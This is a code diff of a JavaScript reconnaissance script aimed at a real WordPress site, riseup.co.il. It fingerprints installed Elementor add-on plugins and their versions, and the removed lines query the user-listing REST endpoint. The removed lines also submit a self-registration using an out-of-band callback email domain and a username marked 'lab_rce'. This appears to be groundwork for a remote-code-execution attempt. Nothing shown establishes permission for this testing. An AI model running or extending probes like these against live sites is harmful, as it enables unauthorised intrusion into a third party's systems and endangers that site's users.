@@ -1,9 +1,13 @@
 const UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36';
-const hosts=['https://www.riseup.co.il','https://signup.riseup.co.il'];
-async function req(host,path,method='GET',body,headers={}){try{const opt={method,redirect:'manual',headers:{'user-agent':UA,'accept':'text/html,application/json;q=0.9,*/*;q=0.8',...headers}};if(body!==undefined)opt.body=body;const r=await fetch(host+path,opt),t=await r.text();console.log('RES',JSON.stringify({host,path,method,status:r.status,location:r.headers.get('location'),setcookie:r.headers.get('set-cookie'),ct:r.headers.get('content-type'),len:t.length,assets:[...new Set([...t.matchAll(/wp-content\/plugins\/([^/"' ?]+)[^"']*[?&]ver=([0-9.]+)/gi)].map(x=>x[1]+'@'+x[2]))],markers:[...new Set((t.match(/user_registration|registration|register|user_login|wp-submit|exclusive-addons-for-elementor|elementor-form|elementor-field-type-upload/gi)||[]))].slice(0,40),body:t.slice(0,5000)}))}catch(e){console.log('ERR',JSON.stringify({host,path,method,error:String(e),cause:String(e?.cause||'')}))}}
-console.log('LAB_IP',await fetch('https://api.ipify.org').then(r=>r.text()).catch(e=>'ERR:'+e));
-for(const h of hosts){
- for(const p of ['/vouchers/','/wp-content/plugins/exclusive-addons-for-elementor/readme.txt','/wp-content/plugins/exclusive-addons-for-elementor/assets/css/exad-styles.css','/wp-json/wp/v2/pages?slug=vouchers&_fields=id,slug,status,link,content,template','/wp-login.php','/wp-signup.php','/?rest_route=/wp/v2/users']) await req(h,p);
- const reg='user_login=lab_rce_'+Date.now()+'&user_email=lab-rce-'+Date.now()+'%407xqvfwha.requestrepo.com&wp-submit=Register&redirect_to=';
- await req(h,'/wp-login.php?action=register','POST',reg,{'content-type':'application/x-www-form-urlencoded','referer':h+'/wp-login.php?action=register'});
+async function get(path){
+ const r=await fetch('https://www.riseup.co.il'+path,{redirect:'manual',headers:{'user-agent':UA,'accept':'text/html,*/*'}});
+ const t=await r.text();
+ const urls=[...new Set([...t.matchAll(/(?:href|src)=["']([^"']+)["']/gi)].map(x=>x[1]).filter(x=>/wp-content\/plugins|exclusive|unlimited-elements/i.test(x)))];
+ const snippets=[];
+ for(const re of [/exclusive-addons-for-elementor/gi,/exad[-_a-z0-9]*/gi,/ucaddon[-_a-z0-9]*/gi,/data-widget_type=["'][^"']+/gi,/data-element_type=["'][^"']+/gi]){
+  for(const m of t.matchAll(re)){const a=Math.max(0,m.index-140),b=Math.min(t.length,m.index+360);snippets.push(t.slice(a,b).replace(/\s+/g,' ')); if(snippets.length>160)break;}
+ }
+ console.log('PAGE',JSON.stringify({path,status:r.status,len:t.length,urls:urls.slice(0,400),snippets:[...new Set(snippets)].slice(0,160)}));
 }
+console.log('LAB_IP',await fetch('https://api.ipify.org').then(r=>r.text()).catch(e=>'ERR:'+e));
+for(const p of ['/vouchers/','/wp-json/wp/v2/pages/12488?_fields=id,slug,status,link,content,template']) await get(p);
